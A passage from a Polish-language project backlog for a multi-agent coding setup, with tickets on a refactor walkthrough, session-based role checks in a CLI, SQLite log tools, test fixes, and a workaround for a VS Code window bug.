   - Jak repository persists entity do bazy?
   - Co to jest transaction support?
   - Pattern: entity → SQL → entity

3. **Backward Compatibility (M3):**
   - Jak AgentBus zachował stare API?
   - Gdzie są adapters (dict → entity)?
   - Dlaczego testy PASS mimo refactoru?

4. **Fail-Fast (M4):**
   - Jak wygląda LegacyAPIMapper?
   - Gdzie są CHECK constraints w bazie?
   - Jak enum_audit działa?

## Format

**Opcja A:** Solo exploration
- Otwórz pliki (VS Code / editor)
- Przeczytaj kod
- Zadawaj pytania gdy coś niejasne

**Opcja B:** Guided tour z Architect
- Backlog #128 (Architect poprowadzi interactive code review)
- Wyjaśnienia decision rationale

## Rezultat

**Zrozumiesz:**
- Co faktycznie zmienił refactor M1-M4
- Jak domain model różni się od dict hell
- Dlaczego fail-fast działa na 4 poziomach
- Jak to jest zbudowane (nie tylko "że działa")

## Effort

**Mała** (~30-60 min w zależności od depth)

## Value

**Wysoka** — właściciel projektu powinien rozumieć swój kod (nie tylko ufać że działa)

## Nota

User powiedział: "zobaczyć na własne oczy co tam jest" — to jest ten task.

### [128] Code walkthrough M1-M4 z użytkownikiem (Architect guide)
**area:** Arch  **value:** wysoka  **effort:** mala  **status:** planned  **created_at:** 2026-03-23

# Backlog: Code Walkthrough M1-M4 (Architect)

## Cel

Przejść przez kod M1-M4 z użytkownikiem — pokazać "na własne oczy" co zostało zbudowane.

## Scope

**Guided tour przez:**

1. **Domain Model (M1):**
   - `core/entities/messaging.py` — Message, Suggestion, Backlog entities
   - Enums: MessageType, SuggestionStatus, BacklogValue, etc.
   - Validation: Pydantic frozen dataclasses

2. **Repositories (M2):**
   - `core/repositories/base.py` — BaseRepository, transaction support
   - `core/repositories/message_repo.py` — MessageRepository
   - Pattern: entity → SQL → entity (clean persistence layer)

3. **Backward Compat (M3):**
   - `tools/lib/agent_bus.py` — adapters (dict API → domain entities)
   - Legacy API preserved: send_message(), get_inbox(), etc.
   - Internal: dict → entity → repo → dict

4. **Fail-Fast (M4):**
   - `core/mappers/legacy_api.py` — LegacyAPIMapper (centralized enum mapping)
   - `tools/enum_audit.py` — CI/CD gate
   - Database schema: CHECK constraints (PRAGMA table_info)

## Format

**Interactive code review:**
- Architect pokazuje kod (Read tool)
- Wyjaśnia pattern, design decisions
- User zadaje pytania
- Kontekst: dlaczego X jest Y (decision rationale z ADR-001)

## Rezultat

User rozumie:
- Jak domain model działa (typed entities vs dict hell)
- Jak fail-fast enforcement jest zaimplementowany (4 layers)
- Dlaczego backward compatibility była kluczowa
- Jak pattern M1-M4 jest reusable

## Effort

**Mała** (~30-45 min interactive session)

## Value

**Wysoka** — zrozumienie własnego systemu (nie tylko "działa", ale "wiem jak działa")

### [127] Session-aware CLI — agent_bus powinien używać roli z sesji
**area:** Dev  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-23

# Backlog: Session-aware CLI — agent_bus powinien używać roli z sesji

## Problem

**Obecnie:**
```bash
# Agent wywołuje session_init
py tools/session_init.py --role developer

# Potem w każdej komendzie musi powtarzać rolę
py tools/agent_bus_cli.py send --from developer --to pe --content-file tmp/x.md
py tools/agent_bus_cli.py suggest --from developer --content-file tmp/y.md
py tools/agent_bus_cli.py log --role developer --content-file tmp/z.md
```

**Problemy:**
1. **Duplikacja** — rola określona w session_init, ale trzeba ją powtarzać w każdym CLI call
2. **Brak walidacji** — agent może podać `--from architect` mimo że sesja to `developer`
3. **Podatność na błędy** — agent może pomylić rolę, podszywać się pod inną rolę
4. **UX** — niepotrzebne powtarzanie tej samej informacji

---

## Rozwiązanie

### 1. session_init.py zapisuje rolę do pliku

**Obecnie:**
```python
# tools/session_init.py
write_session_id(session_id)  # zapisuje do tmp/session_id.txt
```

**Po zmianie:**
```python
# tools/session_init.py
write_session_data({
    "session_id": session_id,
    "role": args.role,
    "created_at": datetime.now().isoformat()
})
# Zapisuje do tmp/session_data.json
```

**Format pliku:**
```json
{
  "session_id": "abc123",
  "role": "developer",
  "created_at": "2026-03-23T10:00:00"
}
```

---

### 2. agent_bus_cli.py czyta rolę z sesji

**Dodaj funkcję:**
```python
def get_session_role() -> str | None:
    """Read current session role from tmp/session_data.json."""
    session_file = Path("tmp/session_data.json")
    if not session_file.exists():
        return None

    data = json.loads(session_file.read_text(encoding="utf-8"))
    return data.get("role")
```

**Użycie w CLI:**
```python
# send command
def cmd_send(args, bus):
    # --from jest opcjonalny, domyślnie bierze z sesji
    sender = args.sender or get_session_role()

    if sender is None:
        return {"ok": False, "error": "No session found. Run session_init.py first."}

    # Walidacja: jeśli user podał --from, musi zgadzać się z sesją
    if args.sender and args.sender != get_session_role():
        return {
            "ok": False,
            "error": f"Cannot send as '{args.sender}' — current session role is '{get_session_role()}'"
        }

    bus.send_message(sender=sender, recipient=args.recipient, content=content, type=args.type)
```

---

### 3. Backward compatibility

**Opcja A (strict):**
- `--from` / `--role` wymagane TYLKO jeśli brak sesji (np. ręczne wywołanie CLI przez człowieka)
- Jeśli sesja istnieje → ignoruj `--from`, zawsze używaj roli z sesji
- Jeśli `--from` ≠ session role → error

**Opcja B (permissive):**
- `--from` opcjonalny (domyślnie z sesji)
- Jeśli podany `--from` zgadza się z sesją → OK
- Jeśli podany `--from` różni się od sesji → error

**Rekomendacja:** Opcja A (strict) — eliminuje ryzyko pomyłki.

---

### 4. Zmiany w CLI

**Komendy do zmiany:**

1. `send` — sender z sesji
2. `suggest` / `suggest-bulk` — author z sesji
3. `log` — role z sesji
4. `flag` — sender z sesji
5. `backlog-add` — (nie wymaga zmiany, backlog nie ma "author")

**Parametry:**
- `--from` / `--role` → opcjonalny (domyślnie z sesji)
- Jeśli brak sesji i brak parametru → error: "No session found. Run session_init.py first."

---

## Expected Outcome

**Agent workflow (po zmianie):**
```bash
# 1. Inicjalizacja sesji (raz na start)
py tools/session_init.py --role developer

# 2. Praca — rola automatycznie z sesji
py tools/agent_bus_cli.py send --to pe --content-file tmp/x.md
py tools/agent_bus_cli.py suggest --content-file tmp/y.md
py tools/agent_bus_cli.py log --content-file tmp/z.md
```

**Bez `--from` / `--role`** — wszystko czytane z sesji.

**Bezpieczeństwo:**
- Agent nie może podszywać się pod inną rolę
- Jeśli spróbuje `--from architect` → error
- Walidacja na poziomie CLI (fail fast)

---

## Benefits

1. **UX** — mniej parametrów, mniej błędów
2. **Security** — agent nie może podszywać się pod inną rolę
3. **Spójność** — rola określona raz (session_init), używana wszędzie
4. **DX** — prompty prostsze (1 parametr mniej w każdym wywołaniu)

---

## Tests

1. `test_send_uses_session_role` — send bez `--from` używa roli z sesji
2. `test_send_rejects_different_role` — send z `--from architect` gdy sesja=developer → error
3. `test_suggest_uses_session_role` — suggest bez `--from` używa roli z sesji
4. `test_no_session_error` — brak sesji + brak `--from` → error z instrukcją

---

## Migration

**Faza 1: Backward compatible (opcjonalnie):**
- Wspieraj zarówno `--from` jak i sesję
- Jeśli oba podane → waliduj że się zgadzają
- Deprecation warning gdy używa `--from`

**Faza 2: Breaking change:**
- `--from` ignorowane (zawsze z sesji)
- Prompty zaktualizowane (usunięcie `--from` z wywołań)

**Rekomendacja:** Skip faza 1, od razu breaking change (agenci dostają zaktualizowane prompty po wdrożeniu).

---

## Priorytet

**Średni** — quality of life + security improvement, nie bloker.

## Area

Dev (narzędzia)

## Value

Średnia (UX + security)

## Effort

Mała:
- session_init.py: write session_data.json (~10 linii)
- agent_bus_cli.py: get_session_role() + validation (~40 linii)
- testy: 4 nowe (~30 linii)
- Łącznie: ~1-2h

### [126] agent_bus_cli.py message --id (get single message by ID)
**area:** Dev  **value:** niska  **effort:** mala  **status:** planned  **created_at:** 2026-03-23

# Backlog Dev: agent_bus_cli.py message --id <id>

## Problem

Brak narzędzia do wyciągnięcia konkretnej wiadomości po ID.

**Obecnie:** Workaround przez inbox + ręczny SQL lub Python script
**Potrzeba:** `py tools/agent_bus_cli.py message --id 228`

## Use case

**Agent workflow:**
1. User: "msg 228"
2. Agent: `py tools/agent_bus_cli.py message --id 228`
3. Output: pełna treść wiadomości

**Bez tego:** Agent musi pisać tymczasowy Python script (overhead, niepotrzebne pliki).

## Scope

**CLI command:**
```bash
py tools/agent_bus_cli.py message --id <id>
```

**Output:**
```json
{
  "ok": true,
  "data": {
    "id": 228,
    "sender": "architect",
    "recipient": "developer",
    "content": "...",
    "type": "suggestion",
    "status": "unread",
    "created_at": "2026-03-23 06:02:45",
    "read_at": null
  }
}
```

**Error handling:**
- Message not found → `{"ok": false, "error": "Message #228 not found"}`

## Implementation

**AgentBus method:**
```python
def get_message_by_id(self, message_id: int) -> dict | None:
    """Get single message by ID."""
    query = "SELECT * FROM messages WHERE id = ?"
    row = self._conn.execute(query, (message_id,)).fetchone()
    return dict(row) if row else None
```

**CLI handler:**
```python
def cmd_message(args, bus):
    msg = bus.get_message_by_id(args.id)
    if not msg:
        return {"ok": False, "error": f"Message #{args.id} not found"}
    return {"ok": True, "data": msg}
```

**CLI parser:**
```python
p_message = subparsers.add_parser("message", help="Get message by ID")
p_message.add_argument("--id", type=int, required=True, help="Message ID")
```

## Expected outcome

Agent może wyciągnąć konkretną wiadomość jedną komendą (bez tymczasowych scriptów).

## Priorytet

Niska — quality of life improvement, workaround dostępny.

## Area

Dev (narzędzia)

## Effort

Mała (~10 min: method + CLI handler + parser)

### [125] Napraw failujące testy (State + Suggestions)
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-23

# Backlog Dev: Napraw failujące testy (State + Suggestions)

## Problem

8 testów failuje w test suite (test_agent_bus.py + test_agent_bus_cli.py):

### State tests (6 failures)
- `TestState::test_write_and_get_state`
- `TestState::test_state_filters_by_type`
- `TestState::test_state_metadata_json`
- `TestState::test_get_state_limit`
- `TestState::test_get_state_ordering_newest_first`
- `TestState::test_state_with_session_id`

**Error:** `AttributeError: 'AgentBus' object has no attribute 'write_state'`

**Root cause:** Metody State (write_state, get_state) usunięte z AgentBus podczas refactoru M3/M4.

### Suggestions tests (2 failures)
- `TestCliSuggestAndBacklog::test_suggest_status_update`
- `TestCliSuggestAndBacklog::test_suggest_status_bulk`

**Error:** `ValueError: 'in_backlog' is not a valid SuggestionStatus`

**Root cause:** Testy używają starego enumu 'in_backlog', ale nowy domain model ma inny zestaw statusów.

## Scope

1. **State tests:** Usunąć całą klasę `TestState` z test_agent_bus.py (metody State nie istnieją)
2. **Suggestions tests:**
   - Sprawdź aktualny `SuggestionStatus` enum w domain model
   - Zaktualizuj testy do zgodności z nowym API (lub usuń jeśli funkcjonalność nie istnieje)

## Expected outcome

- 0 failujących testów w test suite
- Testy zgodne z aktualnym API AgentBus (post-M3 refactor)

## Priorytet

Średni — nie blokuje pracy, ale sygnalizuje technical debt (testy out of sync z kodem).

## Area

Dev (testy)

## Effort

Mała (delete TestState class, update 2 testy Suggestions)

### [124] Dependency support w backlogu (depends_on kolumna)
**area:** Dev  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-23

# Backlog Dev: Dependency support w backlogu

## Problem

Backlog items nie mają kolumny `depends_on` — nie można oznaczyć że task X zależy od task Y.

**Przykład:**
- #119 (PE — sprawdzanie logów w session_start) zależy od #122 (Dev — session-logs tool)
- Obecnie: dependency tylko w `content` (prose) — nie jest machine-readable

## Scope

### 1. Schema migration

Dodaj kolumnę `depends_on` do `backlog`:
```sql
ALTER TABLE backlog ADD COLUMN depends_on INTEGER REFERENCES backlog(id);
```

Domyślnie NULL (backward compatible).

### 2. CLI support

**backlog-add:**
```bash
py tools/agent_bus_cli.py backlog-add --title "..." --area Dev --depends-on 122 --content-file tmp/x.md
```

**backlog-update:**
```bash
py tools/agent_bus_cli.py backlog-update --id 119 --depends-on 122
```

**backlog (read):**
```json
{
  "id": 119,
  "title": "...",
  "depends_on": 122,
  "status": "planned"
}
```

### 3. Validation (opcjonalnie)

Gdy agent próbuje ustawić status `in_progress` na task który ma dependency:
- Sprawdź czy `depends_on` task ma status `done`
- Jeśli nie → warning (nie blokuj, ale zasygnalizuj)

## Expected outcome

1. Agent może oznaczyć dependency: `--depends-on <id>`
2. Backlog pokazuje zależności (machine-readable)
3. Opcjonalnie: validation przed rozpoczęciem pracy

## Priorytet

Średni — quality of life improvement, nie bloker.

## Area

Dev (narzędzia)

## Effort

Średnia (schema migration + CLI + opcjonalna validation)

### [123] session-logs tool: agent_bus_cli.py read session logs
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-23

# Backlog Dev: agent_bus_cli.py session-logs (read tool)

## Problem

Brak dedykowanego toola do odczytu session logów — agenci musieliby używać skomplikowanego SQL inline:
```bash
py -c "import sqlite3; conn = sqlite3.connect('mrowisko.db'); logs = conn.execute('SELECT id, content, created_at FROM session_log WHERE role=? ORDER BY created_at DESC LIMIT 3', ('architect',)).fetchall(); [print(f'--- Log {r[0]} ({r[2]}) ---\\n{r[1]}\\n') for r in logs]"
```

To łamie zasadę "dedykowane narzędzie > bash".

## Scope

### 1. CLI command

Dodaj do `agent_bus_cli.py`:
```bash
py tools/agent_bus_cli.py session-logs --role architect --limit 3
```

**Parametry:**
- `--role` (opcjonalny) — filtruj po roli (jeśli brak → wszystkie role)
- `--limit` (default: 10) — ile logów zwrócić

### 2. Output format

**JSON:**
```json
{
  "ok": true,
  "data": [
    {
      "id": 174,
      "role": "architect",
      "content": "Code review M3 Phase 3 zakończony...",
      "created_at": "2026-03-23 03:25:10"
    },
    ...
  ],
  "count": 3
}
```

**Jeśli kolumna `title` istnieje w przyszłości** (backlog #120):
```json
{
  "id": 174,
  "role": "architect",
  "title": "Code Review M3 Phase 3",
  "content": "...",
  "created_at": "2026-03-23 03:25:10"
}
```

### 3. AgentBus method (opcjonalnie)

```python
def get_session_logs(self, role: str = None, limit: int = 10):
    if role:
        rows = self._conn.execute(
            'SELECT id, role, content, created_at FROM session_log WHERE role=? ORDER BY created_at DESC LIMIT ?',
            (role, limit)
        ).fetchall()
    else:
        rows = self._conn.execute(
            'SELECT id, role, content, created_at FROM session_log ORDER BY created_at DESC LIMIT ?',
            (limit,)
        ).fetchall()
    return [{"id": r[0], "role": r[1], "content": r[2], "created_at": r[3]} for r in rows]
```

## Expected outcome

Agent używa prosty tool zamiast SQL inline:
```bash
py tools/agent_bus_cli.py session-logs --role architect --limit 3
```

Output czytelny, backward compatible z przyszłą kolumną `title`.

## Priorytet

Wysoki — blokuje #119 (PE — dodanie sprawdzania logów do session_start).

## Area

Dev (narzędzia)

## Effort

Mała (1 metoda + CLI command, pattern jak inbox/backlog)

### [122] Bug: Multiple VS Code windows opening when starting claude CLI
**area:** Dev  **value:** srednia  **effort:** mala  **status:** deferred  **created_at:** 2026-03-23

# Bug: Multiple VS Code windows opening when starting `claude` CLI

## Problem

Każde uruchomienie `claude` w terminalu otwiera **3 nowe okna VS Code** zamiast reuse existing window.

**User report:**
> "gdy zrobię nowy terminal i odpalę claude to otwierają mi się nowe okna VSC X3"

## Status: WORKAROUND DOSTĘPNY ✓

### Root Cause (confirmed)

**Known bug w Claude Code CLI** (GitHub issues #31087, #30946, #31136, #32846):
- VS Code integrated terminal ustawia env vars: `CLAUDE_CODE_SSE_PORT`, `TERM_PROGRAM`, `VSCODE_INJECTION`
- Claude wykrywa te zmienne i próbuje IDE integration
- Bug powoduje spawn 3 blank windows zamiast reuse

**Verified w naszym środowisku:**
```
CLAUDE_CODE_SSE_PORT = 60948
TERM_PROGRAM = vscode
VSCODE_INJECTION = 1
```

## Workaround (zaimplementowany)

**Stworzony wrapper script:** `claude-clean.cmd`

**Lokalizacja:** `C:\Users\cypro\AppData\Roaming\npm\claude-clean.cmd`

**Użycie:**
```cmd
claude-clean
```

**Co robi:**
1. Czyści 3 env vars (CLAUDE_CODE_SSE_PORT, TERM_PROGRAM, VSCODE_INJECTION)
2. Uruchamia `claude` z oczyszczonym środowiskiem
3. Zapobiega spawning 3 okien ✓

**Test (do wykonania przez usera):**
1. Otwórz nowy terminal (PowerShell w VS Code)
2. Uruchom: `claude-clean`
3. **Expected:** 1 okno VS Code (lub reuse existing) — NIE 3 okna

## Trade-offs

**Pros:**
- ✓ Rozwiązuje problem 3 okien
- ✓ Nie modyfikuje żadnej konfiguracji systemowej
- ✓ Łatwo odwrócić (usuń `claude-clean.cmd`)
- ✓ Możesz dalej używać `claude` normalnie (jeśli kiedyś potrzebujesz IDE integration)

**Cons:**
- ✗ Musisz pamiętać wpisać `claude-clean` zamiast `claude`
- ✗ Disables VS Code ↔ Claude IDE integration (extension sidebar connection)
  → Dla CLI-only użycia to nie problem

## Long-term Solution

Bug jest **extensively reported** w upstream (Anthropic):
- [#31087](https://github.com/anthropics/claude-code/issues/31087)
- [#30946](https://github.com/anthropics/claude-code/issues/30946)
- [#31136](https://github.com/anthropics/claude-code/issues/31136)
- [#32846](https://github.com/anthropics/claude-code/issues/32846)

**Czekamy na fix od Anthropic** — workaround wystarczy do tego czasu.

## Severity

**Medium → Low** (po workaround):
- Workaround dostępny i prosty
- Problem nie blokuje pracy

## Next Steps

1. **User:** Przetestuj `claude-clean` w nowym terminalu
2. **Jeśli działa:** Używaj `claude-clean` zamiast `claude`
3. **Jeśli chcesz automatyzacji:** Można stworzyć PowerShell alias (Opcja B) — poproś Developera

## Sources

- [CLI started in VS Code integrated terminal opens 3 blank VS Code windows (Windows) · Issue #31087](https://github.com/anthropics/claude-code/issues/31087)
- [3 VS Code windows open on every Claude Code launch since 2.1.69 · Issue #30946](https://github.com/anthropics/claude-code/issues/30946)
- [Bug: Windows: 3 blank VS Code windows spawn on every Claude Code session start · Issue #31136](https://github.com/anthropics/claude-code/issues/31136)
- [VS Code: 3 blank windows open when launching Claude from VS Code terminal · Issue #32846](https://github.com/anthropics/claude-code/issues/32846)

### [121] session_start: 20 logów mrowiska (metadata) dla ról nie-wykonawczych
**area:** Prompt  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-23

# Backlog PE: Dodaj 20 ostatnich logów mrowiska (metadata) do session_start ról nie-wykonawczych

## Problem

Role nie-wykonawcze (Architect, Developer, PE, Metodolog) pracują na poziomie meta — potrzebują szerszego kontekstu "co się działo w mrowisku" poza swoją rolą.

**Obecnie:** Agent widzi tylko własne logi (lub wcale).

**Potrzeba:** Kontekst cross-role — np. Architect widzi że Developer zakończył M3 Phase 3 → może zrobić code review.

## Scope

**Role docelowe (nie-wykonawcze):**
- Architect
- Developer
- Prompt Engineer
- Metodolog

**NIE dotyczy ról wykonawczych:**
- ERP Specialist (skupiony na ERP, noise z innych ról niepotrzebny)
- Analyst (skupiony na danych, noise niepotrzebny)

## Implementacja

### 1. Dependency

**Wymaga:** Backlog Dev — kolumna `title` w `session_log` (inaczej metadata bezużyteczna).

### 2. Dodaj do `<session_start>` 4 ról

**Pliki:**
- `documents/architect/ARCHITECT.md`
- `documents/dev/DEVELOPER.md`
- `documents/prompt_engineer/PROMPT_ENGINEER.md`
- `documents/methodology/METHODOLOGY.md`

**Sekwencja (po inbox, przed action):**

```markdown
5. Sprawdź ostatnie logi swojej roli (3 ostatnie, pełna treść):
   ```
   py -c "import sqlite3, json; conn = sqlite3.connect('mrowisko.db');
   logs = conn.execute('SELECT id, content, created_at FROM session_log WHERE role=? ORDER BY created_at DESC LIMIT 3', ('<rola>',)).fetchall();
   [print(f'--- Log {r[0]} ({r[2]}) ---\\n{r[1]}\\n') for r in logs]"
   ```
   - Czy ostatnia sesja wykonała task podobny do obecnego?
   - Czy artifacts (raporty, plany, ADR) zostały utworzone?

6. Sprawdź ostatnie logi mrowiska (20 ostatnich, metadata: role + title + date):
   ```
   py -c "import sqlite3, json; conn = sqlite3.connect('mrowisko.db');
   logs = conn.execute('SELECT role, title, created_at FROM session_log ORDER BY created_at DESC LIMIT 20').fetchall();
   print(json.dumps([{'role': r[0], 'title': r[1], 'date': r[2]} for r in logs], indent=2))"
   ```
   - Co się działo w mrowisku ostatnio?
   - Czy inna rola zakończyła task powiązany z moim?
   - Kontekst dla eskalacji/współpracy między rolami

7. Sprawdź artifacts dla zadania z inbox (jeśli inbox wskazuje task):
   ```
   Glob: documents/human/reports/*keyword*
   Glob: documents/human/plans/*keyword*
   Glob: documents/architecture/*keyword*
   ```
   - Jeśli artifact istnieje → użyj go, nie duplikuj pracy
   - Jeśli artifact częściowy → uzupełnij, nie pisz od zera
```

**Zastąp `<rola>`:** architect, developer, prompt_engineer, metodolog.

### 3. Trade-offs

**Pros:**
- Agent ma szerszy obraz mrowiska
- Łatwiejsza koordynacja między rolami (Architect widzi że Developer skończył → może reviewować)
- Wykrywa duplikację cross-role (PE zrobił research → Developer nie powtarza)

**Cons:**
- +20 linii metadata (~500 znaków context)
- Zależy od Dev backlog (title w session_log)

## Expected outcome

**Agent na starcie sesji widzi:**
1. **3 ostatnie własne logi** (pełna treść) — "co ja robiłem ostatnio?"
2. **20 ostatnich logów mrowiska** (metadata) — "co się działo ogólnie?"
3. **Artifacts matching inbox task** (Glob) — "czy output już istnieje?"

→ Eliminuje duplikację + lepszy kontekst współpracy.

## Priorytet

Średni — wartość wysoka, ale zależy od Dev backlog.

## Area

Prompt

## Effort

Mała (copy-paste pattern do 4 plików + dostosowanie SQL query per rola)

### [120] session_log: dodaj kolumnę title + CLI support
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-23

# Backlog Dev: Dodaj kolumnę title do session_log

## Problem

Logi sesji (`session_log`) nie mają tytułu — tylko `role`, `content`, `created_at`.
Agent czytając metadata nie wie **o czym** był log, musi czytać pełną treść.

## Przykład użycia

**Obecnie:**
```
id=174, role=architect, created_at=2026-03-23 03:25:10
```
→ Agent nie wie o czym był log.

**Po dodaniu title:**
```
id=174, role=architect, title="Code Review M3 Phase 3", created_at=2026-03-23 03:25:10
```
→ Agent od razu wie co było robione.

## Scope

### 1. Schema migration

Dodaj kolumnę `title` do `session_log`:
```sql
ALTER TABLE session_log ADD COLUMN title TEXT;
```

Domyślnie NULL (backward compatible z istniejącymi logami).

### 2. CLI update

**agent_bus_cli.py log:**
```python
# Obecnie:
agent_bus_cli.py log --role architect --content-file tmp/log.md

# Po zmianie:
agent_bus_cli.py log --role architect --title "Code Review M3 Phase 3" --content-file tmp/log.md
```

`--title` opcjonalny (backward compatible).

### 3. AgentBus.log() method

Dodaj parametr `title` do metody:
```python
def log(self, role: str, content: str, title: str = None, session_id: str = None):
    ...
```

### 4. Query methods (opcjonalnie)

Jeśli będą metody do odczytu logów:
```python
def get_session_logs(self, role: str = None, limit: int = 10):
    # Zwróć: id, role, title, created_at (bez pełnego content)
    ...
```

## Expected outcome

1. Agent może przeczytać **metadata** logów (role + title + date) bez ładowania pełnej treści
2. Backward compatible — stare logi (title=NULL) nadal działają
3. CLI command `log` akceptuje `--title` (opcjonalny)

## Priorytet

Średni — blokuje PE backlog #XXX (20 logów mrowiska na starcie sesji).

## Area

Dev (narzędzia)

## Effort

Mała (schema migration + CLI param + jedna metoda)

### [119] Session start: dodaj check logów roli do wszystkich ról
**area:** Prompt  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-23

# Backlog: Dodaj check logów roli do session_start

**Zależy od:** #123 (Dev — session-logs tool)

## Problem

Role nie sprawdzają logów swojej roli na starcie sesji → duplikacja pracy.

## Przykład

**Sesja Architect 2026-03-23:**
1. Inbox: msg #204 "Request Code Review M3 Phase 3"
2. Rozpocząłem code review od zera
3. **Raport już istniał** (2026-03-22, `code_review_m3_phase3_message_adapters.md`)
4. Dopiero po rozpoczęciu pracy odkryłem duplikację

**Root cause:** `<session_start>` w ARCHITECT.md nie ma instrukcji "sprawdź logi swojej roli".

## Scope

**Dotyczy wszystkich ról:**
- Developer, Architect, ERP Specialist, Analyst, Metodolog, Prompt Engineer

**Pattern powtarzalny:**
- Inbox zawiera request
- Agent zaczyna task od zera
- Task był już wykonany wcześniej (log istnieje)
- Duplikacja pracy

## Proposed Solution

**Dodać do `<session_start>` każdej roli:**

```
5. Sprawdź logi swojej roli (ostatnie 3 sesje):
   ```
   py tools/agent_bus_cli.py session-logs --role <rola> --limit 3
   ```
   - Czy ostatnia sesja wykonała task podobny do obecnego?
   - Czy są artifacts (raporty, plany, ADR) które możesz użyć?
   - Jeśli tak → użyj istniejącego outputu, nie duplikuj pracy
```

**Przykład właściwej sekwencji:**
1. Read SPIRIT.md ✓
2. Backlog ✓
3. Inbox ✓
4. **Logi roli (ostatnie 3 sesje)** → wykryj duplikację
5. Glob artifacts (raporty, plany) → znajdź istniejący output
6. Jeśli task był wykonany → użyj/uzupełnij istniejący output

## Implementation

**PE aktualizuje `<session_start>` w:**
- `documents/architect/ARCHITECT.md`
- `documents/dev/DEVELOPER.md`
- `documents/erp_specialist/ERP_SPECIALIST.md`
- `documents/analyst/ANALYST.md`
- `documents/methodology/METHODOLOGY.md`
- `documents/prompt_engineer/PROMPT_ENGINEER.md`

**Pattern identyczny dla wszystkich ról.**

## Expected Outcome

Agent na starcie sesji:
1. Sprawdza inbox
2. Sprawdza logi swojej roli (ostatnie 3)
3. **Wykrywa jeśli task był już wykonany**
4. Używa istniejącego outputu zamiast duplikować pracę

## Value

- Eliminuje duplikację pracy (time waste)
- Agent context-aware (wie co robił wcześniej)
- Continuity między sesjami (nie zaczyna od zera)

## Dependency

**Requires:** #123 (Dev — agent_bus_cli.py session-logs tool)

Bez session-logs tool agent musiałby używać skomplikowanego SQL inline (bad practice).

### [118] Bug: mark-read --all ustawia read_at przed created_at
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-23

# Bug: mark-read --all ustawia read_at z przyszłością

## Problem

Message #207 ma `read_at` **przed** `created_at`:
- Created: 2026-03-23 04:05:42
- Read At: 2026-03-23 03:07:59

To niemożliwe fizycznie — wiadomość została przeczytana godzinę przed jej utworzeniem.

## Root Cause (hipoteza)

`agent_bus_cli.py mark-read --all --role developer` ustawia `read_at` dla **wszystkich** wiadomości do danej roli, nawet tych które jeszcze nie istniały w momencie wywołania.

**Możliwe scenariusze:**
1. Bulk mark-read używa `UPDATE messages SET read_at = ? WHERE recipient = ?` bez warunku `AND status = 'unread'`
2. Race condition — wiadomość dodana PODCZAS transakcji mark-read
3. Timestamp bug w AgentBus — używa cached timestamp zamiast `datetime.now()`

## Impact

- ✗ Trudne debugowanie (read_at < created_at to red flag)
- ✗ Messages nie pokazują się w inbox --status unread (mimo że są nowe)
- ✗ Agent nie widzi nowych wiadomości po bulk mark-read

## Reproduction

1. `mark-read --all --role developer` (np. 03:07:59)
2. Architect wysyła wiadomość (np. 04:05:42)
3. `inbox --role developer --status unread` → pusty (mimo że msg #207 nowa)
4. SELECT ... WHERE id = 207 → read_at = 03:07:59 (przed created_at)

## Expected Behavior

`mark-read --all` powinno:
- Ustawiać `read_at` tylko dla wiadomości WHERE `status = 'unread'`
- NIE dotykać wiadomości które jeszcze nie istnieją
- `read_at >= created_at` zawsze (invariant)

## Investigation Needed

1. Sprawdź `agent_bus_cli.py mark-read --all` implementation
2. Sprawdź `AgentBus.mark_read()` — czy filtruje po status?
3. Sprawdź `MessageRepository.mark_read()` — SQL WHERE clause
4. Verify race condition scenario (concurrent INSERT + mark-read)

## Severity

**Medium** — nie blokuje pracy, ale powoduje confusion i przeładowany kontekst (agent nie widzi że wiadomość już read).

### [117] session_init: zamień python na py w instrukcjach ról
**area:** Prompt  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-23

# Backlog: session_init używa `python` zamiast `py` w instrukcjach

## Problem

Instrukcje ról w dokumentach (ERP_SPECIALIST.md, DEVELOPER.md, etc.) pokazują:
```
python tools/session_init.py --role <parametr>
```

Na Windows `python` nie jest domyślną komendą — trzeba używać `py`.

Agent próbuje wykonać zgodnie z instrukcją → błąd "command not found" → musi poprawiać ręcznie.

## Scope

Aktualizacja wszystkich dokumentów ról w sekcji `<session_start>`:
- CLAUDE.md
- ERP_SPECIALIST.md
- DEVELOPER.md
- ANALYST.md
- ARCHITECT.md
- METHODOLOGY.md (jeśli ma instrukcje Metodolog)
- PROMPT_ENGINEER.md

Zamień `python tools/session_init.py` → `py tools/session_init.py`

## Expected outcome

Agent widzi w instrukcji `py tools/session_init.py` → wywołuje bezpośrednio → działa od pierwszej próby bez manual correction.

## Notes

To jest PE task — edycja promptów ról.
Developer zgłosił issue, PE wykonuje zmianę.

### [116] Dopracowanie persony Architekta - tone of voice + examples
**area:** Prompt  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-22

# Dopracowanie persony Architekta — tone of voice + przykłady

## Problem

Persona Architekta ma wymiary operacyjne (proaktywność, standard senior, elastyczność), ale brakuje:
1. **Tone of voice** — jak mówi, jak formułuje feedback, styl komunikacji
2. **Few-shot examples** — 2-5 scenariuszy konkretnych zachowań

Research (character_designer.md:133-135) pokazuje że **few-shot examples są skuteczniejsze od dłuższego opisu persony**.

## Kontekst

Feedback #177 pokazał że sama persona nie wystarcza — Architekt był reaktywny mimo "proponuj zanim pytają".
Po pierwszej poprawce (2026-03-22) dodano reguły proaktywności, ale wciąż brakuje konkretów stylu komunikacji.

User (Dawid) musi się zastanowić **czego dokładnie chce od Architekta** zanim dopracujemy personę.

## Propozycja (draft do rozważenia)

Dodać do `<persona>` w ARCHITECT.md:

**1. Tone of voice:**
- Bezpośredni i rzeczowy
- Konkretny (liczby, przykłady, nie ogólniki)
- Trade-off oriented (co zyskujemy kosztem czego)
- Asertywny bez agresji
- Techniczny z kontekstem biznesowym

**2. Przykłady zachowań (3-5 scenariuszy):**
- Scenariusz: odkryłeś problem podczas audytu → mówisz od razu, nie czekasz
- Scenariusz: kod działa, ale poziom mid → proponujesz refaktor z planem
- Scenariusz: user pokazuje trade-offy przeciwne Twojej wizji → zmieniasz zdanie szybko

## Zadania

